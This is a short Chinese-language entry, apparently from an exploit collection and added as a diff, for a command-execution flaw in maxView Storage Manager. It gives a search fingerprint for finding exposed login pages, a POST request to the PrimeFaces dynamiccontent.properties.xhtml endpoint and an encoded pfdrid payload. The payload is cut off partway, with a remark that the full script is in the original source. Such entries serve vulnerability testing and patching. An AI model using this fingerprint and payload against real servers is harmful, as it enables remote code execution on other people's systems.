@@ -1,0 +1,12 @@
+# maxViewStorageManager系统dynamiccontent.properties.xhtml代码执行漏洞
+
+- **系统**：maxViewStorageManager　|　**类型**：命令执行　|　**CVE**：—
+- **指纹**：`title="maxView Storage Manager - Login"`
+- **请求**：`POST /maxview/manager/javax.faces.resource/dynamiccontent.properties.xhtml HTTP/1.1`
+- **关键头**：`Content-Type: application/x-www-form-urlencoded`
+
+**请求体 / payload**
+```
+pfdrt=sc&ln=primefaces&pfdrid=uMKljPgnOTVxmOB%2BH6%2FQEPW9ghJMGL3PRdkfmbiiPkUDzOAoSQnmBt4dYyjvjGhVqupdmBV%2FKAe9gtw54DSQCl72JjEAsHTRvxAuJC%2B%2FIFzB8dhqyGafOLqDOqc4QwUqLOJ5KuwGRarsPnIcJJwQQ7fEGzDwgaD0Njf%2FcNrT5NsETV8ToCfDLgkzjKVoz1ghGlbYnrjgqWarDvBnuv%2BEo5hxA5sgRQcWsFs1aN0zI9h8ecWvxGVmreIAuWduuetMakDq7ccNwStDSn2W6c%2BGvDYH7pKUiyBaGv9gshhhVGunrKvtJmJf04rVOy%2BZLezLj6vK%2BpVFyKR7s8xN5Ol1tz%2FG0VTJWYtaIwJ8rcWJLtVeLnXMlEcKBqd4yAtVfQNLA5AYtNBHneYyGZKAGivVYteZzG1IiJBtuZjHlE3kaH2N2XDLcOJKfyM%2FcwqYIl9PUvfC2Xh63Wh4yCFKJZGA2W0bnzXs8jdjMQoiKZnZiqRyDqkr5PwWqW16%2FI7eog15OBl4Kco%2FVjHHu8Mzg5DOvNevzs7hej…（脚本共 1574 字，完整版见原文）
+```
+- **预期**：200　|　dudesite
